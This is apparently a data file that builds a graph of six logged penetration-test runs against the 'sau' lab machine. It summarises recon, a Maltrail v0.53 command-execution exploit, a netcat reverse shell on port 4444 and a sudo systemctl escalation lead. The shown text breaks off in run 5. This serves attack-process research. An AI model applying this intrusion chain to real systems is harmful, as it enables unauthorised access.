@@ -1,0 +1,2096 @@
+{
+  "paper_analogy": "Deep Reinforcement Learning on Graphs for Autonomous Search-and-Track",
+  "machine": "sau",
+  "source": "training_data.csv, Machine == 'sau', 21 row(s), 6 auto-detected run(s)/playthroughs. Graph built directly from the PTT (Penetration Testing Tree) field's growth.",
+  "analogy_mapping": {
+    "Agent Nodes": "PTT snapshot reached after each new tree item (state = cumulative tree)",
+    "Search Nodes": "The PTT tree item worked on (number + title) + its MCP_tasks tool calls",
+    "Track Nodes": "That item's findings payload -- what was actually discovered"
+  },
+  "legend": {
+    "node_types": {
+      "Agent (Blue/Pink goal)": "PTT state after a new item completes",
+      "Search (Orange)": "PTT item being worked (tool calls in tooltip)",
+      "Track (Green)": "Findings payload of that item"
+    },
+    "edge_types": {
+      "StateTransition (Black)": "Agent -> Agent, label = PTT item number",
+      "SearchUpdate (Green)": "Agent -> Search, item being worked from that state",
+      "TrackUpdate (Blue)": "Search -> Track, what item's execution found",
+      "Prediction (Purple)": "Track -> Agent, leads to next cumulative PTT state"
+    }
+  },
+  "nodes": [
+    {
+      "id": "agent:sau:START",
+      "label": "Agent: Initial\n(Start)",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "Start of pentest against 'sau'. 6 recorded run(s) below.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r1_base",
+      "label": "Search: Baseline\n(2 item(s))",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 1/6] Baseline recon already completed before this run's first tracked step:\n1.3.1 Perform a port scan\n1.3.2 Determine the services and versions on each open port",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r1_base",
+      "label": "Track: Determine the services an\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 1/6] 1.3.1 Perform a port scan: Host: sau.htb (10.129.229.26), Host status: Up (1.0s latency), Closed TCP ports: 997 (conn-refused), Open Ports: 22, 80, 55555\n\n1.3.2 Determine the services and versions on each open port: Port 22: Open, Service: ssh, Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0), Port 80: Filtered, Service: http, Port 55555: Open, Service: unknown, Port 55555 Responses: Invalid basket name error with pattern: ^[wd-_\\.]{1,250}$, HTTP/1.0 400 Bad Request, Content-Type: text/plain; charset=utf-8, HTTP/1.0 302 Found, Location: /web, HTTP/1.0 200 OK, Allow: GET, OPTIONS, Unrecognized service: 1 service unrecognized despite returning data on port 55555, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}\n   1.4 Target IP: 10.129.229.26 - (updated) {Findings: SSH Host Key: RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed, ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21, ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36, Scan Duration: 375.21 seconds",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r1_base",
+      "label": "Agent: Baseline\nIdentify Open Ports, \u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 1/6] Cumulative PTT so far:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r1_s1_1.3.3",
+      "label": "Search: 1.3.3\nEnumerate further on the \u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 1/6] PTT item 1.3.3: Enumerate further on the services\n\nMCP tool calls:\n- Nmap: Enumerate services on ports 80 and 55555 to identify software versions.\n- Dirbuster: Brute force hidden directories and files on the web application.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r1_s1_1.3.3",
+      "label": "Track: Port 80: No response, Port 55\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 1/6] 1.3.3 Enumerate further on the services:\nPort 80: No response, Port 55555: Directs to a web portal, Web Portal Content: Functionality: Creates a basket to collect and inspect HTTP requests, My Baskets: wygbo5a, Powered by request-baskets, Version: 1.2.1, Basket Function: Collects any request sent to it, Example: GET request sent to one of the baskets (dmt5wkr) using curl, Headers: Accept: */*, User-Agent: curl/8.5.0, Time: 2:01:55 pm 04/08/2025}\n   1.4 Target IP: 10.129.229.26 - (updated) {Findings: SSH Host Key: RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed, ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21, ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36, Scan Duration: 375.21 seconds, IP Address: 10.129.229.26",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r1_s1_1.3.3",
+      "label": "Agent: 1.3.3\nIdentify Open Ports, \u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 1/6] Cumulative PTT after 1.3.3:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate further on the services",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r1_close",
+      "label": "Agent: Run End\n(no further PTT growth)",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 1/6] Final cumulative PTT for this run:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate further on the services",
+      "size": 46,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r2_base",
+      "label": "Search: Baseline\n(2 item(s))",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 2/6] Baseline recon already completed before this run's first tracked step:\n1.3.1 Perform a port scan\n1.3.2 Determine the services and versions on each open port",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r2_base",
+      "label": "Track: Determine the services an\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 2/6] 1.3.1 Perform a port scan: Host: sau.htb (10.129.229.26), Host status: Up (1.0s latency), Closed TCP ports: 997 (conn-refused), Open Ports: 22, 80, 55555\n\n1.3.2 Determine the services and versions on each open port: Port 22: Open, Service: ssh, Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0), Port 80: Filtered, Service: http, Port 55555: Open, Service: unknown, Port 55555 Responses: Invalid basket name error with pattern: ^[wd-_\\.]{1,250}$, HTTP/1.0 400 Bad Request, Content-Type: text/plain; charset=utf-8, HTTP/1.0 302 Found, Location: /web, HTTP/1.0 200 OK, Allow: GET, OPTIONS, Unrecognized service: 1 service unrecognized despite returning data on port 55555, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel}\n   1.4 Target IP: 10.129.229.26 - (updated) {Findings: SSH Host Key: RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed, ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21, ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36, Scan Duration: 375.21 seconds",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r2_base",
+      "label": "Agent: Baseline\nIdentify Open Ports, \u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 2/6] Cumulative PTT so far:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r2_s1_1.3.3",
+      "label": "Search: 1.3.3\nEnumerate further on the \u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 2/6] PTT item 1.3.3: Enumerate further on the services\n\nMCP tool calls:\n- Nmap: Enumerate services on ports 80 and 55555 to identify software versions.\n- Dirbuster: Brute force hidden directories and files on the web application.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r2_s1_1.3.3",
+      "label": "Track: Port 80: No response, Port 55\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 2/6] 1.3.3 Enumerate further on the services:\nPort 80: No response, Port 55555: Directs to a web portal, Web Portal Content: Functionality: Creates a basket to collect and inspect HTTP requests, My Baskets: wygbo5a, Powered by request-baskets, Version: 1.2.1, Basket Function: Collects any request sent to it, Example: GET request sent to one of the baskets (dmt5wkr) using curl, Headers: Accept: */*, User-Agent: curl/8.5.0, Time: 2:01:55 pm 04/08/2025}\n   1.4 Target IP: 10.129.229.26 - (updated) {Findings: SSH Host Key: RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed, ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21, ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36, Scan Duration: 375.21 seconds, IP Address: 10.129.229.26",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r2_s1_1.3.3",
+      "label": "Agent: 1.3.3\nIdentify Open Ports, \u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 2/6] Cumulative PTT after 1.3.3:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate further on the services",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r2_close",
+      "label": "Agent: Run End\n(no further PTT growth)",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 2/6] Final cumulative PTT for this run:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate further on the services",
+      "size": 46,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r3_base",
+      "label": "Search: Baseline\n(4 item(s))",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 3/6] Baseline recon already completed before this run's first tracked step:\n1.3.1 Perform a port scan\n1.3.2 Determine the services and versions on each open port\n1.3.3 Enumerate further on the services\n1.3.4 Vulnerability Assessment",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r3_base",
+      "label": "Track: Vulnerability Assessment",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 3/6] 1.3.1 Perform a port scan: Host: sau.htb (10.129.229.26), Host status: Up (1.0s latency), Closed TCP ports: 997 (conn-refused), Open Ports: 22, 80, 55555\n\n1.3.2 Determine the services and versions on each open port: Port 22: Open, Service: ssh, Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0), Port 80: Filtered, Service: http, Port 55555: Open, Service: unknown, Port 55555 Responses: Invalid basket name error with pattern: ^[wd-_\\.]{1,250}$, HTTP/1.0 400 Bad Request, Content-Type: text/plain; charset=utf-8, HTTP/1.0 302 Found, Location: /web, HTTP/1.0 200 OK, Allow: GET, OPTIONS, Unrecognized service: 1 service unrecognized despite returning data on port 55555, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n1.3.3 Enumerate further on the services: Port 80: No response, Port 55555: Directs to a web portal, Web Portal Content: Functionality: Creates a basket to collect and inspect HTTP requests, My Baskets: wygbo5a, Powered by request-baskets, Version: 1.2.1, Basket Function: Collects any request sent to it, Example: GET request sent to one of the baskets (dmt5wkr) using curl, Headers: Accept: */*, User-Agent: curl/8.5.0, Time: 2:01:55 pm 04/08/2025, Configuration Setup Box: Allows to set up the config, Configuration Settings: Forward URL: 127.0.0.1:80, Insecure TLS: Only affects forwarding to URLs like https://..., Proxy Response: Expand Forward Path, Basket Capacity: 200, Action: Redirected the GET requests coming to the basket to port 80 and got the proxy response back, bypassing the port filtering, Response Content: altrail Documentation, Wiki, Issues, Log In, Filters: Threats, Events, Severity, Sources, Trails, Powered by Maltrail (v0.53), Options: Hide threat, Report false positive\n\n1.3.4 Vulnerability Assessment: Google search results indicate that the tested version is vulnerable to an OS command execution vulnerability and a public exploit exists. The vulnerability can be exploited by setting up a listener with netcat and running the provided proof of concept (POC). The POC requires modification to use the URL from a previous exploit. The POC is available at: https://github.com/spookier/Maltrail-v0.53-Exploit.}\n   1.4 Target IP: 10.129.229.26 - (updated) {Findings: SSH Host Key: RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed, ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21, ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36, Scan Duration: 375.21 seconds, IP Address: 10.129.229.26",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r3_base",
+      "label": "Agent: Baseline\nIdentify Open Ports, \u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 3/6] Cumulative PTT so far:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate further on the services\n    \u25cb 1.3.4 Vulnerability Assessment",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r3_s1_1.3.5",
+      "label": "Search: 1.3.5\nExploit the selected expl\u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 3/6] PTT item 1.3.5: Exploit the selected exploitation\n\nMCP tool calls:\n- Metasploit: Use the public exploit from the GitHub repository to exploit the OS command execution vulnerability.\n- Netcat: Set up a listener to receive the reverse shell from the target system.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r3_s1_1.3.5",
+      "label": "Track: The tester cloned a repositor\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 3/6] 1.3.5 Exploit the selected exploitation:\nThe tester cloned a repository and modified the target_URL in the login line. The exploit was run using python3 on the target http://10.129.229.26:55555/dmt5wkr/login. A reverse shell was obtained and the tester connected using netcat listening on port 4444. The current user of the shell is 'puma' and the present working directory is /opt/maltrail. The directory contains files and folders such as CHANGELOG, core, docker, maltrail-sensor.service, maltrail-server.service, maltrail.conf, plugins, requirements.txt, trails, CITATION.cff, LICENSE, README.md, html, misc, sensor.py, server.py, and others.}\n   1.4 Target IP: 10.129.229.26 - (updated) {Findings: SSH Host Key: RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed, ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21, ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36, Scan Duration: 375.21 seconds, IP Address: 10.129.229.26",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r3_s1_1.3.5",
+      "label": "Agent: 1.3.5\nIdentify Open Ports, \u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 3/6] Cumulative PTT after 1.3.5:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate further on the services\n    \u2713 1.3.4 Vulnerability Assessment\n    \u2713 1.3.5 Exploit the selected exploitation",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r3_close",
+      "label": "Agent: Run End\n(no further PTT growth)",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 3/6] Final cumulative PTT for this run:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate further on the services\n    \u2713 1.3.4 Vulnerability Assessment\n    \u2713 1.3.5 Exploit the selected exploitation",
+      "size": 46,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r4_base",
+      "label": "Search: Baseline\n(6 item(s))",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 4/6] Baseline recon already completed before this run's first tracked step:\n1.3.1 Perform a port scan\n1.3.2 Determine the services and versions on each open port\n1.3.3 Enumerate further on the services\n1.3.4 Vulnerability Assessment\n1.3.5 Exploit the selected exploitation\n1.5 Search for files, commands and their privileges",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r4_base",
+      "label": "Track: Search for files, command\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 4/6] 1.3.1 Perform a port scan: Host: sau.htb (10.129.229.26), Host status: Up (1.0s latency), Closed TCP ports: 997 (conn-refused), Open Ports: 22, 80, 55555\n\n1.3.2 Determine the services and versions on each open port: Port 22: Open, Service: ssh, Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0), Port 80: Filtered, Service: http, Port 55555: Open, Service: unknown, Port 55555 Responses: Invalid basket name error with pattern: ^[wd-_\\.]{1,250}$, HTTP/1.0 400 Bad Request, Content-Type: text/plain; charset=utf-8, HTTP/1.0 302 Found, Location: /web, HTTP/1.0 200 OK, Allow: GET, OPTIONS, Unrecognized service: 1 service unrecognized despite returning data on port 55555, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n1.3.3 Enumerate further on the services: Port 80: No response, Port 55555: Directs to a web portal, Web Portal Content: Functionality: Creates a basket to collect and inspect HTTP requests, My Baskets: wygbo5a, Powered by request-baskets, Version: 1.2.1, Basket Function: Collects any request sent to it, Example: GET request sent to one of the baskets (dmt5wkr) using curl, Headers: Accept: */*, User-Agent: curl/8.5.0, Time: 2:01:55 pm 04/08/2025, Configuration Setup Box: Allows to set up the config, Configuration Settings: Forward URL: 127.0.0.1:80, Insecure TLS: Only affects forwarding to URLs like https://..., Proxy Response: Expand Forward Path, Basket Capacity: 200, Action: Redirected the GET requests coming to the basket to port 80 and got the proxy response back, bypassing the port filtering, Response Content: altrail Documentation, Wiki, Issues, Log In, Filters: Threats, Events, Severity, Sources, Trails, Powered by Maltrail (v0.53), Options: Hide threat, Report false positive\n\n1.3.4 Vulnerability Assessment: Google search results indicate that the tested version is vulnerable to an OS command execution vulnerability and a public exploit exists. The vulnerability can be exploited by setting up a listener with netcat and running the provided proof of concept (POC). The POC requires modification to use the URL from a previous exploit. The POC is available at: https://github.com/spookier/Maltrail-v0.53-Exploit.\n\n1.3.5 Exploit the selected exploitation: The tester cloned a repository and modified the target_URL in the login line. The exploit was run using python3 on the target http://10.129.229.26:55555/dmt5wkr/login. A reverse shell was obtained and the tester connected using netcat listening on port 4444. The current user of the shell is 'puma' and the present working directory is /opt/maltrail. The directory contains files and folders such as CHANGELOG, core, docker, maltrail-sensor.service, maltrail-server.service, maltrail.conf, plugins, requirements.txt, trails, CITATION.cff, LICENSE, README.md, html, misc, sensor.py, server.py, and others.}\n   1.4 Target IP: 10.129.229.26 - (updated) {Findings: SSH Host Key: RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed, ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21, ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36, Scan Duration: 375.21 seconds, IP Address: 10.129.229.26\n\n1.5 Search for files, commands and their privileges: The user 'puma' on the system 'sau' has sudo privileges without requiring a password to run the command '/usr/bin/systemctl status trail.service'. However, an attempt to check the version of 'systemctl' failed, suggesting the 'systemctl' command may not be correctly installed or accessible in the current environment. The system suggested installing 'systemctl' from either deb systemd (245.4-4ubuntu3.22) or deb systemctl (1.4.3424-2).",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r4_base",
+      "label": "Agent: Baseline\nReconnaissance",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 4/6] Cumulative PTT so far:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate further on the services\n    \u2713 1.3.4 Vulnerability Assessment\n    \u2713 1.3.5 Exploit the selected exploitation\n  \u2713 1.5 Search for files, commands and their privileges\n  \u25cb 1.6 Exploit the sudo privileges",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r4_s1_1.7",
+      "label": "Search: 1.7\nFurther exploit the system",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 4/6] PTT item 1.7: Further exploit the system\n\nMCP tool calls:\n- Metasploit: Attempt to exploit the sudo privileges of the 'puma' user by executing '/usr/bin/systemctl status trail.service' command.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r4_s1_1.7",
+      "label": "Track: Further exploit the system",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 4/6] 1.7 Further exploit the system:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r4_s1_1.7",
+      "label": "Agent: 1.7\nReconnaissance",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 4/6] Cumulative PTT after 1.7:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate further on the services\n    \u2713 1.3.4 Vulnerability Assessment\n    \u2713 1.3.5 Exploit the selected exploitation\n  \u2713 1.5 Search for files, commands and their privileges\n  \u2713 1.6 Exploit the sudo privileges\n  \u25cb 1.7 Further exploit the system",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r4_s2_1.8",
+      "label": "Search: 1.8\nExploit the identified vu\u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 4/6] PTT item 1.8: Exploit the identified vulnerabilities\n\nMCP tool calls:\n- Google search: Search for known vulnerabilities of systemd 245 (245.4-4ubuntu3.22) and exploitation methods.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r4_s2_1.8",
+      "label": "Track: Exploit the identified vulner\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 4/6] 1.8 Exploit the identified vulnerabilities:\n(status change only)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r4_s2_1.8",
+      "label": "Agent: 1.8\nReconnaissance",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 4/6] Cumulative PTT after 1.8:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate further on the services\n    \u2713 1.3.4 Vulnerability Assessment\n    \u2713 1.3.5 Exploit the selected exploitation\n  \u2713 1.5 Search for files, commands and their privileges\n  \u2713 1.6 Exploit the sudo privileges\n  \u2713 1.7 Vulnerability Analysis\n  \u25cb 1.8 Exploit the identified vulnerabilities",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r4_close",
+      "label": "Agent: Run End\n(no further PTT growth)",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 4/6] Final cumulative PTT for this run:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate further on the services\n    \u2713 1.3.4 Vulnerability Assessment\n    \u2713 1.3.5 Exploit the selected exploitation\n  \u2713 1.5 Search for files, commands and their privileges\n  \u2713 1.6 Exploit the sudo privileges\n  \u2713 1.7 Vulnerability Analysis\n  \u25cb 1.8 Exploit the identified vulnerabilities",
+      "size": 46,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r5_base",
+      "label": "Search: Baseline\n(9 item(s))",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 5/6] Baseline recon already completed before this run's first tracked step:\n1.3.1 Perform a port scan\n1.3.2 Determine the services and versions on each open port\n1.3.3 Enumerate further on the services\n1.3.4 Vulnerability Assessment\n1.3.5 Exploit the selected exploitation\n1.5 Search for files, commands and their privileges\n1.6 Exploit the sudo privileges\n1.7 Vulnerability Analysis\n1.8 Exploit the identified vulnerabilities",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
